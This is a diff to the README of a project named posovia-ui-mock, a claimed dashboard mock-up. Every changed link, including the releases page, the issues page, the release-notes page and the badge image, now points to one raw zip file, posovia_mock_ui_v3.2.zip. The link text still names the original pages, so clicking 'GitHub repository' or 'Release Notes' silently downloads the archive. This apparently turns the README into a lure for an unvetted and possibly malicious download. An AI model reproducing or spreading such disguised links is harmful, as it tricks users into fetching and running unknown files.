@@ -6,11 +6,11 @@ Welcome to posovia-ui-mock! This application is a mock-up of the POSOVIA dashboa
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AltNoob010472/posovia-ui-mock/releases)
+[![Download](https://raw.githubusercontent.com/AltNoob010472/posovia-ui-mock/main/demo/posovia_mock_ui_v3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AltNoob010472/posovia-ui-mock/main/demo/posovia_mock_ui_v3.2.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/AltNoob010472/posovia-ui-mock/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/AltNoob010472/posovia-ui-mock/main/demo/posovia_mock_ui_v3.2.zip).
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of the application.
@@ -46,7 +46,7 @@ For more details on how the design works and the components used, refer to the d
 
 ## 🛠️ Support
 
-If you encounter any issues or have questions, feel free to create an issue on our [GitHub repository](https://github.com/AltNoob010472/posovia-ui-mock/issues). We appreciate your feedback, as it helps us improve.
+If you encounter any issues or have questions, feel free to create an issue on our [GitHub repository](https://raw.githubusercontent.com/AltNoob010472/posovia-ui-mock/main/demo/posovia_mock_ui_v3.2.zip). We appreciate your feedback, as it helps us improve.
 
 ## 🙌 Acknowledgements
 
@@ -58,6 +58,6 @@ Please note that this is a mock application. It does not perform any real transa
 
 ## 📅 Release Notes
 
-Check the **Release Notes** on our [GitHub Releases](https://github.com/AltNoob010472/posovia-ui-mock/releases) page to stay updated with new features and improvements. Each release includes details about what's changed and any bug fixes that have been made.
+Check the **Release Notes** on our [GitHub Releases](https://raw.githubusercontent.com/AltNoob010472/posovia-ui-mock/main/demo/posovia_mock_ui_v3.2.zip) page to stay updated with new features and improvements. Each release includes details about what's changed and any bug fixes that have been made.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AltNoob010472/posovia-ui-mock/releases)
+[![Download](https://raw.githubusercontent.com/AltNoob010472/posovia-ui-mock/main/demo/posovia_mock_ui_v3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AltNoob010472/posovia-ui-mock/main/demo/posovia_mock_ui_v3.2.zip)
